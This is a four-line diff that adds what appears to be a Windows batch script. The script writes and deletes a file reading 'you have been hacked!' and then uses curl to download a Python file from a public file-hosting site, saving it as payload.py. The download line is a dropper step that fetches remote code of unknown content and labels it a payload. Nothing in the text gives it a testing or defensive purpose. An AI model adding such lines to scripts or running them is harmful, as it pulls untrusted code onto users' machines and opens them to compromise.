@@ -1,0 +1,4 @@
+echo you have been hacked! > mal.txt
+type mal.txt
+del mal.txt
+curl https://files.catbox.moe/gdn6jf.py -o payload.py
